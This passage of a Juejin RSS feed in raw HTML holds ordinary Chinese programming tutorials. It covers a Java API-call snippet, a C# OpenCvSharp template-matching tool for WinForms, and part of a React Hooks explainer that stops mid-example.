    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-type">OkHttpClient</span> <span class="hljs-variable">client</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OkHttpClient</span>();

        <span class="hljs-type">String</span> <span class="hljs-variable">json</span> <span class="hljs-operator">=</span> <span class="hljs-string">"{"</span> +
                <span class="hljs-string">"\"model\": \"deepseek-ai/DeepSeek-V3\","</span> +
                <span class="hljs-string">"\"messages\": [{\"role\": \"user\", \"content\": \"测试一下，回复'配置成功'\"}],"</span> +
                <span class="hljs-string">"\"stream\": false"</span> +
                <span class="hljs-string">"}"</span>;

        <span class="hljs-type">RequestBody</span> <span class="hljs-variable">body</span> <span class="hljs-operator">=</span> RequestBody.create(
                json, MediaType.get(<span class="hljs-string">"application/json; charset=utf-8"</span>));

        <span class="hljs-type">Request</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Request</span>.Builder()
                .url(<span class="hljs-string">"https://api.siliconflow.cn/v1/chat/completions"</span>)
                .header(<span class="hljs-string">"Authorization"</span>, <span class="hljs-string">"Bearer sk-xxxxxxxxxxxxxxxxxxxxxxxx"</span>)
                .post(body)
                .build();

        <span class="hljs-keyword">try</span> (<span class="hljs-type">Response</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> client.newCall(request).execute()) {
            <span class="hljs-keyword">if</span> (response.isSuccessful()) {
                System.out.println(response.body().string());
            } <span class="hljs-keyword">else</span> {
                System.err.println(<span class="hljs-string">"配置错误: "</span> + response.code());
            }
        } <span class="hljs-keyword">catch</span> (IOException e) {
            e.printStackTrace();
        }
    }
}
</code></pre>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <!----></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[工业视觉 C# + OpenCvSharp 的模板匹配实战]]></title>    <link>https://juejin.cn/post/7589942565011718170</link>    <guid>https://juejin.cn/post/7589942565011718170</guid>    <pubDate>2026-01-02T05:34:47.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589942565011718170" data-draft-id="7589962224795648038" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="工业视觉 C# + OpenCvSharp 的模板匹配实战"/> <meta itemprop="keywords" content="后端,C#,.NET"/> <meta itemprop="datePublished" content="2026-01-02T05:34:47.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="小码编匠"/> <meta itemprop="url" content="https://juejin.cn/user/1308876155395739"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            工业视觉 C# + OpenCvSharp 的模板匹配实战
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1308876155395739/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    小码编匠
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T05:34:47.000Z" title="Fri Jan 02 2026 05:34:47 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言</h2>
<p>使用 OpenCvSharp 在 WinForms 中实现模板匹配</p>
<h3 data-id="heading-1">项目概述</h3>
<p>模板匹配是计算机视觉中一种基础而实用的技术，用于在一幅较大的“源图像”中定位与给定“模板图像”最相似的区域。本文将引导您使用 <strong>OpenCvSharp</strong> 库，在 C# 的 <strong>WinForms</strong> 桌面应用中实现一个完整的模板匹配工具。</p>
<p>该应用支持用户上传源图和模板图，执行匹配后，在源图像上高亮显示匹配位置，并输出匹配置信度（相似度得分），便于直观判断匹配效果。</p>
<h3 data-id="heading-2">环境设置</h3>
<p>在开始编码前，请通过 NuGet 包管理器安装以下依赖项：</p>
<ul>
<li>
<p><code>OpenCvSharp4</code></p>
</li>
<li>
<p><code>OpenCvSharp4.runtime.win</code></p>
</li>
<li>
<p><code>OpenCvSharp4.Extensions</code>（注意：若使用 .NET 6+，可能需额外引用 <code>System.Drawing.Common</code>）</p>
</li>
</ul>
<p>这些包提供了 OpenCV 的 C# 封装、运行时库以及与 <code>System.Drawing.Bitmap</code> 的互操作支持。</p>
<h3 data-id="heading-3">用户界面设计</h3>
<p>应用程序包含以下主要控件：</p>
<ul>
<li>
<p>两个 <code>PictureBox</code>：分别用于显示源图像和模板图像</p>
</li>
<li>
<p>两个文本框与按钮：用于选择图像文件路径</p>
</li>
<li>
<p>一个"执行匹配"按钮</p>
</li>
<li>
<p>一个结果显示 <code>PictureBox</code> 和标签（Label）用于显示置信度</p>
</li>
</ul>
<h3 data-id="heading-4">核心功能实现</h3>
<h4 data-id="heading-5">1、选择源图像</h4>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">btnSelectSource_Click</span>(<span class="hljs-params"><span class="hljs-built_in">object</span> sender, EventArgs e</span>)</span>
{
    <span class="hljs-keyword">using</span> (OpenFileDialog openFileDialog = <span class="hljs-keyword">new</span> OpenFileDialog())
    {
        openFileDialog.Filter = <span class="hljs-string">"Image files (*.png;*.jpg;*.jpeg;*.bmp)|*.png;*.jpg;*.jpeg;*.bmp|All files (*.*)|*.*"</span>;
        <span class="hljs-keyword">if</span> (openFileDialog.ShowDialog() == DialogResult.OK)
        {
            sourcePath = openFileDialog.FileName;
            txtSourcePath.Text = sourcePath;
            pictureBoxSource.Image = System.Drawing.Image.FromFile(sourcePath);
        }
    }
}
</code></pre>
<h4 data-id="heading-6">2、选择模板图像</h4>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">btnSelectTemplate_Click</span>(<span class="hljs-params"><span class="hljs-built_in">object</span> sender, EventArgs e</span>)</span>
{
    <span class="hljs-keyword">using</span> (OpenFileDialog openFileDialog = <span class="hljs-keyword">new</span> OpenFileDialog())
    {
        openFileDialog.Filter = <span class="hljs-string">"Image files (*.png;*.jpg;*.jpeg;*.bmp)|*.png;*.jpg;*.jpeg;*.bmp|All files (*.*)|*.*"</span>;
        <span class="hljs-keyword">if</span> (openFileDialog.ShowDialog() == DialogResult.OK)
        {
            templatePath = openFileDialog.FileName;
            txtTemplatePath.Text = templatePath;
            pictureBoxTemplate.Image = System.Drawing.Image.FromFile(templatePath);
        }
    }
}
</code></pre>
<h4 data-id="heading-7">3、执行模板匹配</h4>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">btnMatch_Click</span>(<span class="hljs-params"><span class="hljs-built_in">object</span> sender, EventArgs e</span>)</span>
{
    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">string</span>.IsNullOrEmpty(sourcePath) || <span class="hljs-built_in">string</span>.IsNullOrEmpty(templatePath))
    {
        MessageBox.Show(<span class="hljs-string">"Please select both source and template images."</span>, <span class="hljs-string">"Error"</span>, MessageBoxButtons.OK, MessageBoxIcon.Error);
        <span class="hljs-keyword">return</span>;
    }

    <span class="hljs-keyword">using</span> (Mat source = Cv2.ImRead(sourcePath))
    <span class="hljs-keyword">using</span> (Mat template = Cv2.ImRead(templatePath))
    <span class="hljs-keyword">using</span> (Mat result = <span class="hljs-keyword">new</span> Mat())
    {
        <span class="hljs-comment">// 执行归一化相关系数匹配</span>
        Cv2.MatchTemplate(source, template, result, TemplateMatchModes.CCoeffNormed);
        
        <span class="hljs-comment">// 获取最佳匹配位置和置信度</span>
        Cv2.MinMaxLoc(result, <span class="hljs-keyword">out</span> _, <span class="hljs-keyword">out</span> <span class="hljs-built_in">double</span> maxVal, <span class="hljs-keyword">out</span> _, <span class="hljs-keyword">out</span> Point maxLoc);

        <span class="hljs-keyword">if</span> (maxVal &gt; <span class="hljs-number">0.8</span>) <span class="hljs-comment">// 阈值可根据实际需求调整</span>
        {
            <span class="hljs-comment">// 在源图上绘制匹配框</span>
            Cv2.Rectangle(
                source,
                maxLoc,
                <span class="hljs-keyword">new</span> Point(maxLoc.X + template.Width, maxLoc.Y + template.Height),
                Scalar.Red,
                thickness: <span class="hljs-number">2</span>
            );
            
            <span class="hljs-comment">// 转换为 Bitmap 并显示</span>
            pictureBoxResult.Image = BitmapConverter.ToBitmap(source);
            lblResult.Text = <span class="hljs-string">$"Match found! Confidence: <span class="hljs-subst">{maxVal:F2}</span>"</span>;
        }
        <span class="hljs-keyword">else</span>
        {
            lblResult.Text = <span class="hljs-string">"No match found."</span>;
        }
    }
}
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/af3992139ad840f89ab3e1a1f9347d3b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP56CB57yW5Yyg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767936886&amp;x-signature=sUkU8bQlTdo6zv3qeGzCHhyUo8g%3D" alt="e60688c8f470b02392d5688af5ee85af_139718bb5d1de9bb7d68c35b20795b24.image.webp" loading="lazy"/></p>
<h3 data-id="heading-8">关键点解析</h3>
<h4 data-id="heading-9">1、匹配方法选择</h4>
<p>使用 <code>TemplateMatchModes.CCoeffNormed</code>（归一化相关系数），其输出值范围为 [0, 1]，越接近 1 表示相似度越高，适合大多数场景。</p>
<p>2、阈值设定</p>
<p>示例中设为 0.8，但实际应用中应根据图像质量、光照变化、尺度差异等因素动态调整。</p>
<p>3、结果可视化</p>
<p>通过 <code>Cv2.Rectangle</code> 在原图上绘制红色矩形框，直观标出匹配区域。</p>
<p>4、图像格式转换</p>
<p>利用 <code>BitmapConverter.ToBitmap()</code> 将 OpenCV 的 <code>Mat</code> 对象转为 WinForms 可显示的 <code>Bitmap</code>，这是 OpenCvSharp.Extensions 提供的关键桥梁。</p>
<h3 data-id="heading-10">性能考虑</h3>
<p>对于高分辨率图像或需要实时处理的场景，可考虑以下优化：</p>
<ul>
<li>
<p>使用后台线程（如 <code>Task.Run</code>）避免 UI 卡顿</p>
</li>
<li>
<p>对图像进行预缩放以降低计算量</p>
</li>
<li>
<p>若硬件支持，启用 OpenCV 的 CUDA 后端（需编译支持 GPU 的 OpenCvSharp 版本）</p>
</li>
</ul>
<h3 data-id="heading-11">总结</h3>
<p>通过本示例，我们成功在 WinForms 中开发了一个简单但完整的模板匹配工具。这项技术广泛应用于工业检测（如零件定位）、文档分析、游戏辅助、自动化测试等领域。</p>
<p>虽然模板匹配对旋转、缩放和形变敏感，但在受控环境下仍是非常高效可靠的方案。结合 OpenCvSharp 强大的图像处理能力，开发者可以快速将其集成到各类桌面应用中。</p>
<p>希望本文能帮助大家掌握模板匹配的基本实现思路，并激发更多计算机视觉应用场景的探索。</p>
<h3 data-id="heading-12">关键词</h3>
<p>OpenCvSharp、模板匹配、WinForms、C#、计算机视觉、图像处理、MatchTemplate、CCoeffNormed、工业检测、BitmapConverter</p>
<p>otteach.cn/post/1051</p>
<h3 data-id="heading-13">最后</h3>
<p>如果你觉得这篇文章对你有帮助，不妨点个赞支持一下！你的支持是我继续分享知识的动力。如果有任何疑问或需要进一步的帮助，欢迎随时留言。</p>
<p>也可以加入微信公众号 <strong>[DotNet技术匠]</strong> 社区，与其他热爱技术的同行一起交流心得，共同成长！</p>
<p><strong>优秀是一种习惯，欢迎大家留言学习！</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[React Hooks：函数组件的状态与副作用管理艺术]]></title>    <link>https://juejin.cn/post/7589942565011685402</link>    <guid>https://juejin.cn/post/7589942565011685402</guid>    <pubDate>2026-01-02T04:58:54.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589942565011685402" data-draft-id="7589962224795582502" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="React Hooks：函数组件的状态与副作用管理艺术"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-01-02T04:58:54.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Zyx2007"/> <meta itemprop="url" content="https://juejin.cn/user/3924597867554890"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            React Hooks：函数组件的状态与副作用管理艺术
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3924597867554890/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Zyx2007
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T04:58:54.000Z" title="Fri Jan 02 2026 04:58:54 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在现代 React 开发中，函数组件已不再是“无状态”的代名词。借助 <strong>Hooks</strong>——以 <code>use</code> 开头的一系列内置函数，开发者可以在不编写类的前提下，轻松管理组件的状态、执行副作用、订阅外部数据源，甚至自定义逻辑复用机制。这一设计不仅让代码更贴近原生 JavaScript 的表达习惯，也推动了组件逻辑的清晰化与模块化。</p>
<h2 data-id="heading-0">useState：声明响应式状态</h2>
<p><code>useState</code> 是最基础的 Hook，用于在函数组件中引入可变状态：</p>
<pre><code class="hljs language-scss" lang="scss">const <span class="hljs-selector-attr">[num, setNum]</span> = <span class="hljs-built_in">useState</span>(<span class="hljs-number">0</span>);
</code></pre>
<p>它返回一个包含当前状态值和更新函数的数组。值得注意的是，<code>useState</code> 的初始值可以是一个函数，适用于需要复杂同步计算的场景：</p>
<pre><code class="hljs language-ini" lang="ini">const <span class="hljs-section">[num, setNum]</span> = useState(() =&gt; {
  const <span class="hljs-attr">a</span> = <span class="hljs-number">1</span> + <span class="hljs-number">2</span><span class="hljs-comment">;</span>
  const <span class="hljs-attr">b</span> = <span class="hljs-number">2</span> + <span class="hljs-number">3</span><span class="hljs-comment">;</span>
  return a + b<span class="hljs-comment">; // 返回确定的初始值</span>
})<span class="hljs-comment">;</span>
</code></pre>
<p>这种形式确保初始化逻辑仅在组件首次渲染时执行一次，避免不必要的重复计算。但需注意：<strong>该函数必须是同步且纯的</strong>，不能包含异步操作（如 <code>fetch</code>），因为状态必须在渲染前确定。</p>
<p>此外，<code>setNum</code> 不仅能接收新值，还可接受一个函数，其参数为上一次的状态：</p>
<pre><code class="hljs language-scss" lang="scss">&lt;<span class="hljs-selector-tag">button</span> onClick={() =&gt; <span class="hljs-built_in">setNum</span>(prev =&gt; prev + <span class="hljs-number">1</span>)}&gt;
  {num}
&lt;/<span class="hljs-selector-tag">button</span>&gt;
</code></pre>
<p>当状态更新依赖于前一状态时（如计数器、列表追加），使用函数式更新能避免因闭包捕获旧值而导致的竞态问题，确保状态演进的正确性。</p>
<h2 data-id="heading-1">useEffect：统一处理副作用</h2>
<p>如果说 <code>useState</code> 负责“记忆”，那么 <code>useEffect</code> 就负责“行动”。它用于执行<strong>副作用操作</strong>——即那些不影响组件渲染结果但必须发生的逻辑，如数据请求、定时器、DOM 操作等。</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-built_in">useEffect</span>(() =&gt; {
  console<span class="hljs-selector-class">.log</span>('组件挂载完成');
}, <span class="hljs-selector-attr">[]</span>);
</code></pre>
<p>通过传入空依赖数组 <code>[]</code>，该副作用仅在组件<strong>首次挂载后执行一次</strong>，等效于类组件中的 <code>componentDidMount</code>。</p>
<p>当依赖项变化时，<code>useEffect</code> 会重新运行：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`num 变为 <span class="hljs-subst">${num}</span>`</span>);
}, [num]);
</code></pre>
<p>这类似于 <code>componentDidUpdate</code>，可用于监听特定状态或 props 的变化并作出响应。</p>
<h2 data-id="heading-2">清理副作用：防止内存泄漏</h2>
<p>许多副作用需要在组件卸载或重新执行前进行清理，例如清除定时器、取消网络请求、移除事件监听器等。<code>useEffect</code> 支持返回一个<strong>清理函数</strong>：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">const</span> timer = <span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(num);
  }, <span class="hljs-number">1000</span>);

  <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'清除定时器'</span>);
    <span class="hljs-built_in">clearInterval</span>(timer);
  };
}, [num]);
</code></pre>
<p>该清理函数会在以下两种情况下被调用：</p>
<ol>
<li><strong>组件卸载时</strong>：释放资源，防止内存泄漏；</li>
<li><strong>下一次副作用执行前</strong>（若依赖项变化）：先清理旧副作用，再执行新副作用。</li>
</ol>
<p>这种机制确保了副作用的生命周期与组件状态严格同步，避免了常见的“已卸载组件仍尝试更新状态”错误。</p>
<h2 data-id="heading-3">副作用的本质：打破纯函数的边界</h2>
<p>React 组件本质上应是一个<strong>纯函数</strong>：给定相同的 props 和 state，始终返回相同的 JSX。而副作用（如修改全局变量、发起网络请求、改变 DOM）则打破了这一原则，因其结果具有不确定性或对外部环境产生影响。</p>
<p>例如，以下函数存在副作用：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">nums</span>) {
  nums.<span class="hljs-title function_">push</span>(<span class="hljs-number">3</span>); <span class="hljs-comment">// 修改了外部数组</span>
